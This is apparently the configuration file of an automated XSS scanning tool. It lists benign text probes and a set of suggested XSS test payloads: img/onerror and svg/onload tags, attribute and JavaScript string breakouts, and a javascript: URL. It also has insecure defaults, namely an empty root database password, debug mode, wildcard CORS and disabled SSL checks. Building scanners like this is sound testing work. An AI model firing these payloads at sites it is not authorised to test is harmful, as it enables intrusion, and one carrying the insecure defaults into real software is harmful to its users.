"""
项目全局配置。
优先级：
1. 环境变量
2. 本文件默认值
"""

SYSTEM_NAME = "XSS漏洞自动化挖掘工具"
SYSTEM_VERSION = "0.1.0"

HOST = "127.0.0.1"
PORT = 5001
FLASK_DEBUG = True
CORS_ORIGINS = "*"

FRONTEND_HOST = "127.0.0.1"
FRONTEND_PORT = 5173
FRONTEND_DIR = "web"
WEB_API_BASE = "http://127.0.0.1:5001/api"
AUTH_INVITE_CODE = "zxz2026_xss"

DATABASE_URL = "sqlite:///dev.db"
MYSQL_HOST = "127.0.0.1"
MYSQL_PORT = 3306
MYSQL_USER = "root"
MYSQL_PASSWORD = ""
MYSQL_DATABASE = "server"
MYSQL_POOL_SIZE = 10
MYSQL_MAX_OVERFLOW = 20

MAX_DEPTH_DEFAULT = 2
MAX_PAGES_DEFAULT = 200
USE_SELENIUM_DEFAULT = False

CRAWLER_USER_AGENT = "server-crawler/0.1"
CRAWLER_ROBOTSTXT_OBEY = True
CRAWLER_CONCURRENT_REQUESTS = 16
CRAWLER_CONCURRENT_REQUESTS_PER_DOMAIN = 8
CRAWLER_DOWNLOAD_TIMEOUT = 20
CRAWLER_RETRY_TIMES = 2
SCRAPY_HTTPCACHE_DIR = ".scrapy/.httpcache"
SCRAPY_LOG_LEVEL = "DEBUG"

SELENIUM_ENABLED = True
SELENIUM_TIMEOUT = 20
SELENIUM_WAIT_SECONDS = 2

AI_ENABLED = True

# AI API Key 相关说明占位

AI_TIMEOUT = 60.0
AI_TEMPERATURE = 0.3
AI_MAX_TOKENS = 2000

DYNAMIC_VERIFY_ENABLED = True
DYNAMIC_VERIFY_USE_SELENIUM = False
DYNAMIC_VERIFY_MAX_PAGES = 10
DYNAMIC_VERIFY_MAX_FORMS_PER_PAGE = 3
DYNAMIC_VERIFY_TIMEOUT = 15.0
DYNAMIC_VERIFY_WAIT_SECONDS = 2.0
DYNAMIC_VERIFY_PAYLOAD = "Zxz_xss_payload"
DYNAMIC_VERIFY_TRUST_ENV = False
DYNAMIC_VERIFY_SSL_VERIFY = False

# 系统默认动态验证 payload。
# 选择这个值而不是直接放可执行标签，是因为它更像“探针”而不是“攻击串”：
# 1. 足够稳定，便于判断输入有没有被带回页面。
# 2. 破坏性低，不会一上来就依赖浏览器执行事件。
# 3. 命中后更容易从响应里直接定位和解释。
DYNAMIC_VERIFY_PAYLOAD_WHY = "默认先用纯文本探针确认输入链路是否存在，优先追求稳定回显、低副作用和易解释性。"

# 多轮安全探针预设。
# 这一组 payload 的目标不是直接利用，而是先区分输入落在 HTML 文本、属性、脚本还是 hash 读取链路里。
DYNAMIC_VERIFY_SAFE_PROBE_PRESETS = {
    "query_text": {
        "label": "Query 文本探针",
        "payload": "xsslab_probe_text_2026",
        "vector": "query",
        "context": "html_text",
        "reason": "优先确认查询参数是否进入页面文本内容。",
        "why": "先用纯文本探针判断 query 参数是否可达页面内容，这是最基础也最稳定的一步。",
    },
    "query_attr": {
        "label": "Query 属性探针",
        "payload": 'xsslab_probe_attr_2026"',
        "vector": "query",
        "context": "html_attr",
        "reason": "用于观察属性边界附近是否出现探针。",
        "why": "末尾补一个双引号，是为了试探输入是否靠近 HTML 属性边界，便于发现属性逃逸风险。",
    },
    "form_text": {
        "label": "Form 文本探针",
        "payload": "xsslab_probe_form_2026",
        "vector": "form",
        "context": "html_text",
        "reason": "优先确认表单字段回显。",
        "why": "表单是最常见的输入面，先看它是否形成回显链路，能最快判断后续是否值得深挖。",
    },
    "form_attr": {
        "label": "Form 属性探针",
        "payload": 'xsslab_probe_form_attr_2026"',
        "vector": "form",
        "context": "html_attr",
        "reason": "用于观察表单输入值是否进入属性位置。",
        "why": "给表单探针补引号，是为了区分“普通回显”和“可能落进属性值”的场景。",
    },
    "hash_text": {
        "label": "Hash 文本探针",
        "payload": "xsslab_probe_hash_2026",
        "vector": "hash",
        "context": "dom_hash",
        "reason": "用于确认 hash 片段是否被页面读取。",
        "why": "hash 更偏前端路由和 DOM 读写场景，用专门探针比复用 query/form 文本更容易解释结果。",
    },
    "query_js": {
        "label": "Query 脚本探针",
        "payload": "'xsslab_probe_js_2026'",
        "vector": "query",
        "context": "script",
        "reason": "用于观察脚本字符串附近是否出现探针。",
        "why": "两边补单引号，是为了试探输入是否进入 JavaScript 字符串上下文。",
    },
    "form_js": {
        "label": "Form 脚本探针",
        "payload": "'xsslab_probe_form_js_2026'",
        "vector": "form",
        "context": "script",
        "reason": "用于观察表单输入是否进入脚本上下文。",
        "why": "表单输入如果被拼进脚本，普通文本探针不够敏感，所以这里用脚本字符串形态做区分。",
    },
    "query_fallback": {
        "label": "基础探针",
        "payload": "xsslab_probe_basic_2026",
        "vector": "query",
        "context": "summary",
        "reason": "没有明显输入面时，保留一个最基础的验证探针。",
        "why": "当上下文不明确时，回到最朴素的文本探针，避免一开始就用过强 payload 带来误判。",
    },
}

# 推荐 payload 预设。
# 这一组更偏“人工复测候选项”，会比安全探针更贴近真实上下文，但仍然保持可读、易解释。
DYNAMIC_VERIFY_SUGGESTED_PAYLOAD_PRESETS = {
    "html_tag": {
        "label": "HTML 标签注入",
        "payload": "<img src=x onerror=alert(1)>",
        "why": "img/onerror 兼容性高，适合验证输入是否被当成可解析 HTML 节点插入页面。",
    },
    "svg_event": {
        "label": "SVG 事件注入",
        "payload": "<svg onload=alert(1)>",
        "why": "SVG 常用于补充验证标签注入场景，适合观察不同解析器对事件触发的处理差异。",
    },
    "attr_breakout_double": {
        "label": "属性闭合注入",
        "payload": '" autofocus onfocus=alert(1) x="',
        "why": "先闭合双引号属性，再补一个可触发事件，适合验证属性值逃逸。",
    },
    "attr_breakout_single": {
        "label": "单引号属性注入",
        "payload": "' onmouseover='alert(1)' x='",
        "why": "和双引号版本互补，用来覆盖单引号包裹属性的页面。",
    },
    "query_reflect": {
        "label": "查询参数反射",
        "payload": "<img src=x onerror=alert(1)>",
        "vector": "query",
        "why": "query 是最常见反射入口，先用标签型 payload 看是否直接进入可解析区域。",
    },
    "query_attr_breakout": {
        "label": "查询参数属性逃逸",
        "payload": '" onmouseover="alert(1)',
        "vector": "query",
        "why": "当 query 参数可能进入属性值时，这类 payload 比普通文本更容易暴露边界问题。",
    },
    "hash_inject": {
        "label": "Hash 片段注入",
        "payload": "<svg onload=alert(1)>",
        "vector": "hash",
        "why": "hash 常由前端脚本读取，SVG 事件型 payload 适合观察 DOM 型场景。",
    },
    "form_reflect": {
        "label": "表单回显注入",
        "payload": "<img src=x onerror=alert(1)>",
        "vector": "form",
        "why": "表单值如果被原样拼回页面，img/onerror 是最直观的可解析标签测试。",
    },
    "form_attr_breakout": {
        "label": "表单属性逃逸",
        "payload": '" autofocus onfocus=alert(1) x="',
        "vector": "form",
        "why": "专门用于区分表单输入是进入文本节点还是属性值位置。",
    },
    "js_string_double": {
        "label": "JS 字符串闭合",
        "payload": '";alert(1);//',
        "why": "用于测试输入是否进入双引号 JavaScript 字符串，并尝试闭合后继续执行。",
    },
    "js_string_single": {
        "label": "JS 单引号闭合",
        "payload": "';alert(1);//",
        "why": "与双引号版本互补，用来覆盖单引号脚本字符串场景。",
    },
    "javascript_protocol": {
        "label": "协议执行",
        "payload": "javascript:alert(1)",
        "why": "适合验证 href、src、跳转拼接这类协议位是否被带入危险协议。",
    },
    "basic_probe": {
        "label": "基础探针",
        "payload": "xsslab_probe_2026",
        "why": "当上下文线索不足时，先保留一个最容易定位、最不容易误伤的基础探针。",
    },
    "page_query": {
        "label": "页面查询参数",
        "payload": "<img src=x onerror=alert(1)>",
        "vector": "query",
        "why": "页面本身带 query 参数时，优先给出最常用的 query 复测候选。",
    },
    "page_form": {
        "label": "页面表单注入",
        "payload": "<img src=x onerror=alert(1)>",
        "vector": "form",
        "why": "页面存在表单时，优先提供一个直接可观察的表单注入候选。",
    },
    "page_hash": {
        "label": "页面 Hash 注入",
        "payload": "<svg onload=alert(1)>",
        "vector": "hash",
        "why": "页面存在 hash 相关逻辑时，优先提供面向 DOM 场景的 hash 候选。",
    },
}
